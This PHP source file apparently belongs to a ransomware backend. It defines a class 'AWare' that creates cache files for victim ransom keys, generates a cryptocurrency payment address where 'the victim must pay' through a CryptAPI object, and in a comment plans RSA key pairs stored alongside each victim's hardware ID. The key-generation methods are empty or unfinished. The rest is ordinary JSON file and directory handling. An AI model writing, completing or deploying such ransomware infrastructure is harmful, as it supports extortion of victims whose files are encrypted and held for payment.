<?php

class AWare
{
    private $CryptAPIObject;

    private $CachePath;
    private $VictimKeysCache;

    public function __construct($CryptAPIObject)
    {
        $this->CryptAPIObject = $CryptAPIObject;
    }

    public function DefineJsonCachePaths($LogsCacheFile, $LogsRansomVictimKeys)
    {
        $this->CachePath = $LogsCacheFile;
        $this->VictimKeysCache = $LogsRansomVictimKeys;        
    }

    public function GenerateVictimRansomKeys($PC_IDENTIFIER)
    {
        $this->GenerateFileAndDirectoryInCaseDoesNotExist($this->CachePath);
        $this->GenerateFileAndDirectoryInCaseDoesNotExist($this->VictimKeysCache);

        # Here create the address where the victim must pay
        $AddressIn = $this->CryptAPIObject->GenerateAddress('https://' . Domain . '/AWare_API.php');

        /*
            Here the public and private RSA keys will be created, 
            the public key will be sent to the user and the private key 
            will be stored in the cache together with the user's HWID and the address where the user must pay
        */
    }

    private function CreatePairEncryptionKeys()
    {
        
    }

    private function GenerateFileAndDirectoryInCaseDoesNotExist($File)
    {
        # If the file already exists
        if (file_exists($File))
        {
            # it returns
            return;
        }

        # If the file does not contain the '/' sign
        if (!str_contains($File, '/'))
        {
            # A empty .json file is saved directly to the path
            $this->CreateJsonFile($File, []);
            return;
        }

        # If it is a directory, here it will do a split with the /
        $PathSplitted = explode('/', $File);

        # If the directory does not exist
        if (!file_exists($PathSplitted[0]))
        {
            # The directory will be created
            mkdir($PathSplitted[0], 0777, true);
        }

        # The new path will be saved (directory / name of the .json file)
        $File = $PathSplitted[0] . '/' . $PathSplitted[1];

        # The file will be created
        $this->CreateJsonFile($File, []);
    }

    private function CreateJsonFile($Path, $Array)
    {
        file_put_contents($Path, json_encode($Array, JSON_PRETTY_PRINT));
    }
}